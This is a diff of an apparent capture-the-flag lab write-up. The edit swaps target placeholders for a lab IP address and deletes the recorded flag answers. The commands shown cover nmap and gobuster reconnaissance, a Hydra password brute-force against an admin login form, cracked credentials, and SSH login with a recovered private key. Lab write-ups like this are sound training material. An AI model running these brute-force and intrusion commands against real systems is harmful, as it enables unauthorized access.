@@ -9,7 +9,7 @@ Linux machine with two exposed services. The attack path chains web directory en
 ### Network Scanning
 
 ```bash
-nmap -sC -sV <target_ip>
+nmap -sC -sV 10.64.160.20
 ```
 
 Open ports:
@@ -22,7 +22,7 @@ Open ports:
 The default Apache page offered no immediate leads. Directory enumeration revealed a hidden admin panel:
 
 ```bash
-gobuster dir -u http://<target_ip> -x html,php,txt -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
+gobuster dir -u http://10.64.160.20 -x html,php,txt -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
 ```
 
 Result: `/admin` - a login form.
@@ -44,7 +44,7 @@ This confirmed the admin panel username and introduced a second username (`john`
 With the username known, Hydra against the login form was straightforward:
 
 ```bash
-hydra -l admin -P /usr/share/wordlists/rockyou.txt <target_ip> http-post-form \
+hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.64.160.20 http-post-form \
 "/admin/index.php:user=^USER^&pass=^PASS^:F=Username or password invalid" -f -V
 ```
 
@@ -57,10 +57,6 @@ admin:xavier
 ### Retrieving the Web Flag and SSH Key
 
 Logging into the admin panel yielded the first flag and a downloadable SSH private key (`id_rsa`) belonging to user `john`.
-
-```
-THM{brut3_f0rce_is_e4sy}
-```
 
 ### Cracking the SSH Key Passphrase
 
@@ -81,7 +77,7 @@ rockinroll
 
 ```bash
 chmod 600 id_rsa
-ssh -i id_rsa john@<target_ip>
+ssh -i id_rsa john@10.64.160.20
 ```
 
 ---
@@ -140,16 +136,6 @@ whoami
 
 ```
 root
-```
-
----
-
-## Flags
-
-```
-web flag  -> THM{brut3_f0rce_is_e4sy}
-user.txt  -> THM{a_password_is_not_a_barrier}
-root.txt  -> THM{pr1v1l3g3_3sc4l4t10n}
 ```
 
 ---
